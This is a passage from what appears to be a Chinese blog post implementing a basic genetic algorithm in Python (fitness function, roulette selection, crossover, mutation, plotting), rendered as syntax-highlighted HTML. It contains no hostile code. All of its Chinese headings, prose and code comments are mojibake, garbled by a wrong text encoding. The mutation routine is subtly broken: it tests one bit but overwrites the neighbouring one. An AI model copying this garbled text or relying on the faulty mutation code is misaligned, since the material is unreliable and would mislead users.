punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            son<span class="token operator">=</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            daughter<span class="token operator">=</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        offspring<span class="token punctuation">.</span>append<span class="token punctuation">(</span>son<span class="token punctuation">)</span>        offspring<span class="token punctuation">.</span>append<span class="token punctuation">(</span>daughter<span class="token punctuation">)</span>    <span class="token keyword">return</span> offspring</code></pre></blockquote><h2 id="ÂÆö‰πâÂèòÂºÇÊñπÊ≥ï"><a href="#ÂÆö‰πâÂèòÂºÇÊñπÊ≥ï" class="headerlink" title="ÂÆö‰πâÂèòÂºÇÊñπÊ≥ï"></a>ÂÆö‰πâÂèòÂºÇÊñπÊ≥ï</h2><blockquote><p>Âç≥‰ΩøÂü∫Âõ†Á™ÅÂèòÁöÑÊ¶ÇÁéáÊûÅÂ∞èÔºå‰ΩÜ‰πüÈúÄË¶ÅÂÆö‰πâ‰∏Ä‰∏™Âü∫Âõ†Á™ÅÂèòÊñπÊ≥ïÔºö</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#ÂèòÂºÇÁÆóÂ≠ê</span><span class="token comment" spellcheck="true">#offspring‰∏∫‰∫§ÂèâÂêéÁöÑÁßçÁæ§Ôºåpm‰∏∫Âü∫Âõ†ÂèòÂºÇÊ¶ÇÁéá</span><span class="token keyword">def</span> <span class="token function">mutation</span><span class="token punctuation">(</span>offspring<span class="token punctuation">,</span>pm<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>offspring<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>pm<span class="token punctuation">:</span>            position<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#'str' object does not support item assignment,cannot use = to change value</span>            <span class="token keyword">if</span> position<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>position<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">:</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>position<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'1'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">:</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'0'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> offspring</code></pre></blockquote><h2 id="ÂºÄÂßãËø≠‰ª£ËøõÂåñ"><a href="#ÂºÄÂßãËø≠‰ª£ËøõÂåñ" class="headerlink" title="ÂºÄÂßãËø≠‰ª£ËøõÂåñ"></a>ÂºÄÂßãËø≠‰ª£ËøõÂåñ</h2><blockquote><p>‰∏ªÂáΩÊï∞Â¶Ç‰∏ãÔºö</p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#ÈÄöËøámatplotlibÂ∫ìÁªòÂá∫ÂáΩÊï∞ÂõæÂΩ¢</span>    <span class="token comment" spellcheck="true"># plt.plot(x,y)</span>    <span class="token comment" spellcheck="true"># plt.annotate('local max', xy=(1.4, max(y)), xytext=(0, 200),</span>    <span class="token comment" spellcheck="true">#             arrowprops=dict(facecolor='black', shrink=0.05),</span>    <span class="token comment" spellcheck="true">#             )</span>    <span class="token comment" spellcheck="true"># plt.show()</span>    population <span class="token operator">=</span> Init_popu<span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span>    mean <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    X<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        population<span class="token punctuation">,</span>Dpopulation <span class="token operator">=</span> Decode<span class="token punctuation">(</span>population<span class="token punctuation">)</span>        y<span class="token punctuation">,</span>population <span class="token operator">=</span> gafunction<span class="token punctuation">(</span>population<span class="token punctuation">,</span>Dpopulation<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(DNAdict)</span>        new_population <span class="token operator">=</span> selection<span class="token punctuation">(</span>population<span class="token punctuation">,</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#crossover ‰∫§Âèâ</span>        offspring <span class="token operator">=</span>crossover<span class="token punctuation">(</span>new_population<span class="token punctuation">,</span><span class="token number">0.8</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#mutation ÂèòÂºÇ</span>        population<span class="token operator">=</span>mutation<span class="token punctuation">(</span>offspring<span class="token punctuation">,</span><span class="token number">0.001</span><span class="token punctuation">)</span>        population<span class="token punctuation">,</span>Dpopulation <span class="token operator">=</span> Decode<span class="token punctuation">(</span>population<span class="token punctuation">)</span>        y<span class="token punctuation">,</span>population <span class="token operator">=</span> gafunction<span class="token punctuation">(</span>population<span class="token punctuation">,</span>Dpopulation<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#ÈÄöËøáÂπ≥ÂùáÂÄºË°®Á§∫Ëø≠‰ª£ËøõÂåñ</span>        meannum <span class="token operator">=</span> np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#ÈÄöËøáÊúÄÂ∞èÂÄºË°®Á§∫Ëø≠‰ª£ËøõÂåñ</span>        minnum <span class="token operator">=</span> min<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#ÈÄöËøáÊúÄÂ§ßÂÄºË°®Á§∫Ëø≠‰ª£ËøõÂåñ</span>        maxnum <span class="token operator">=</span> max<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        X<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        Y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>minnum<span class="token punctuation">)</span>        Y1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>meannum<span class="token punctuation">)</span>        Y2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>maxnum<span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y2<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'g'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y1<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>axhline<span class="token punctuation">(</span>FuncMax<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> linewidth<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>      plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>    </code></pre><p>ÈÅó‰º†ÁÆóÊ≥ïÂÆû‰æãËøêË°åÊïàÊûúÂ¶Ç‰∏ãÔºö</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018180316.png" class="lazyload"></p><blockquote><p>Áé∞Âú®ÂØπÈÅó‰º†ÁÆóÊ≥ï‰πüÂ§ßÊ¶ÇÊúâ‰∏™ÁÆÄÂçïÁöÑ‰∫ÜËß£Âï¶ÔºåÊöÇÊó∂Âà∞ËøôÂÑø„ÄÇ</p></blockquote><p>ÈôÑ‰∏äÂÆåÊï¥‰ª£Á†ÅÔºö<a href="https://github.com/Yof3ng/algorithm/blob/master/SGA.py" target="_blank" rel="noopener">https://github.com/Yof3ng/algorithm/blob/master/SGA.py</a></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>__Author__ <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">import</span> math<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">def</span> <span class="token function">FuncMax</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    xx <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span>    yy<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#ÈÄöËøáÂæ™ÁéØËÆ°ÁÆóÊØè‰∏Ä‰∏™xÂÄºÂØπÂ∫îÁöÑyÂÄº</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> xx<span class="token punctuation">:</span>        a<span class="token operator">=</span> <span class="token number">200</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0.05</span><span class="token operator">*</span>ii<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>ii<span class="token punctuation">)</span><span class="token punctuation">)</span>        yy<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token keyword">return</span> max<span class="token punctuation">(</span>yy<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#Ê†πÊçÆÂáΩÊï∞ÂéüÂûãËÆ°ÁÆóË°®Áé∞ÂûãÔºàyÂÄº)ÔºåÂç≥ÈÄÇÂ∫îÂ∫¶</span><span class="token keyword">def</span> <span class="token function">gafunction</span><span class="token punctuation">(</span>population<span class="token punctuation">,</span>dpopulation<span class="token punctuation">)</span><span class="token punctuation">:</span>    y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    flag<span class="token operator">=</span><span class="token number">0</span>    pp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#ÈÄöËøáÂæ™ÁéØËÆ°ÁÆóÊØè‰∏Ä‰∏™xÂÄºÂØπÂ∫îÁöÑyÂÄº</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> dpopulation<span class="token punctuation">:</span>        a<span class="token operator">=</span> <span class="token number">200</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0.05</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Áî±‰∫éÊòØËÆ°ÁÆóÊúÄÂ§ßÂÄºÔºåËã•Â≠òÂú®Ê≠£Êï∞ÂàôÁõ¥Êé•ÂéªÈô§Ë¥üÊï∞‰∏™‰Ωì</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> y<span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span><span class="token number">1</span>    yy <span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    n<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> y<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>                yy<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                pp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span>            n<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">return</span> yy<span class="token punctuation">,</span>pp    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> y<span class="token punctuation">,</span>population<span class="token comment" spellcheck="true">#Ëß£Á†Å</span><span class="token keyword">def</span> <span class="token function">Decode</span><span class="token punctuation">(</span>population<span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    Dpopulation <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#print(population)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> population<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#Â∞Ü‰∫åËøõÂà∂ËΩ¨Êç¢‰∏∫Êï¥ÂûãÊï∞ÂÄº</span>        x <span class="token operator">=</span> eval<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token operator">+</span>i<span class="token punctuation">)</span>        x <span class="token operator">=</span> x<span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">14</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">2</span>        Dpopulation<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># someone = str(population[flag])</span>        <span class="token comment" spellcheck="true"># express[i] = DNAdict[someone]</span>    <span class="token keyword">return</span> population<span class="token punctuation">,</span>Dpopulation    <span class="token comment" spellcheck="true">#return express</span>    <span class="token comment" spellcheck="true"># print(bx[0:100])</span>    <span class="token comment" spellcheck="true"># print(ast.literal_eval('0b'+bx[1]))</span><span class="token comment" spellcheck="true">#ÂàùÂßãÂåñ‰∏™‰Ωì</span><span class="token keyword">def</span> <span class="token function">Init_popu</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>    population<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i  <span class="token keyword">in</span> range<span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>        entity<span class="token operator">=</span><span class="token string">''</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            entity <span class="token operator">=</span> entity<span class="token operator">+</span>str<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        population<span class="token punctuation">.</span>append<span class="token punctuation">(</span>entity<span class="token punctuation">)</span>    <span class="token keyword">return</span> population<span class="token comment" spellcheck="true">#ÂÆö‰πâÁâ©Á´ûÂ§©Êã©,Âº±ËÄÖÊ∑òÊ±∞</span><span class="token keyword">def</span> <span class="token function">selection</span><span class="token punctuation">(</span>population<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#ËΩÆÁõòËµåÈÄâÊã©,ÊüìËâ≤‰ΩìÁ¥ØËÆ°Ê¶ÇÁéá</span>    fitness_sum<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            fitness_sum<span class="token punctuation">.</span>append<span class="token punctuation">(</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            fitness_sum<span class="token punctuation">.</span>append<span class="token punctuation">(</span>fitness_sum<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>fitness_sum<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        fitness_sum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/=</span>sum<span class="token punctuation">(</span>y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#ËøõË°åÈÄâÊã©ÔºåÊ∑òÊ±∞Âº±ËÄÖÔºåËé∑ÂèñÊñ∞ÁßçÁæ§</span>    population_new<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        rand<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> j<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token number">0</span><span class="token operator">&lt;</span>rand <span class="token operator">and</span> rand<span class="token operator">&lt;=</span>fitness_sum<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    population_new<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> fitness_sum<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>rand <span class="token operator">and</span> rand<span class="token operator">&lt;=</span>fitness_sum<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    population_new<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    new_population<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#Áïô‰∏ã‰ºòÁßÄ‰∏™‰Ωì</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> set<span class="token punctuation">(</span>population_new<span class="token punctuation">)</span><span class="token punctuation">:</span>        new_population<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">return</span> new_population    <span class="token comment" spellcheck="true">#return population_new</span><span class="token comment" spellcheck="true">#‰∫§ÂèâÁÆóÂ≠ê</span><span class="token keyword">def</span> <span class="token function">crossover</span><span class="token punctuation">(</span>population_new<span class="token punctuation">,</span> pc<span class="token punctuation">)</span><span class="token punctuation">:</span>    half<span class="token operator">=</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>population_new<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>    father<span class="token operator">=</span>population_new<span class="token punctuation">[</span><span class="token punctuation">:</span>half<span class="token punctuation">]</span>    mother<span class="token operator">=</span>population_new<span class="token punctuation">[</span>half<span class="token punctuation">:</span><span class="token punctuation">]</span>    np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>father<span class="token punctuation">)</span>    np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>mother<span class="token punctuation">)</span>    offspring<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>half<span class="token punctuation">)</span><span class="token punctuation">:</span>              <span class="token keyword">if</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>pc<span class="token punctuation">:</span>            copint <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            son<span class="token operator">=</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>copint<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>copint<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            daughter<span class="token operator">=</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>copint<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>copint<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            son<span class="token operator">=</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            daughter<span class="token operator">=</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        offspring<span class="token punctuation">.</span>append<span class="token punctuation">(</span>son<span class="token punctuation">)</span>        offspring<span class="token punctuation">.</span>append<span class="token punctuation">(</span>daughter<span class="token punctuation">)</span>    <span class="token keyword">return</span> offspring<span class="token comment" spellcheck="true">#ÂèòÂºÇÁÆóÂ≠ê</span><span class="token keyword">def</span> <span class="token function">mutation</span><span class="token punctuation">(</span>offspring<span class="token punctuation">,</span>pm<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>offspring<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>pm<span class="token punctuation">:</span>            position<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#'str' object does not support item assignment,cannot use = to change value</span>            <span class="token keyword">if</span> position<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>position<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">:</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>position<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'1'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">:</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'0'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> offspring<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#ÈÄöËøámatplotlibÂ∫ìÁªòÂá∫ÂáΩÊï∞ÂõæÂΩ¢</span>    <span class="token comment" spellcheck="true"># plt.plot(x,y)</span>    <span class="token comment" spellcheck="true"># plt.annotate('local max', xy=(1.4, max(y)), xytext=(0, 200),</span>    <span class="token comment" spellcheck="true">#             arrowprops=dict(facecolor='black', shrink=0.05),</span>    <span class="token comment" spellcheck="true">#             )</span>    <span class="token comment" spellcheck="true"># plt.show()</span>    population <span class="token operator">=</span> Init_popu<span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span>    mean <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    X<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        population<span class="token punctuation">,</span>Dpopulation <span class="token operator">=</span> Decode<span class="token punctuation">(</span>population<span class="token punctuation">)</span>        y<span class="token punctuation">,</span>population <span class="token operator">=</span> gafunction<span 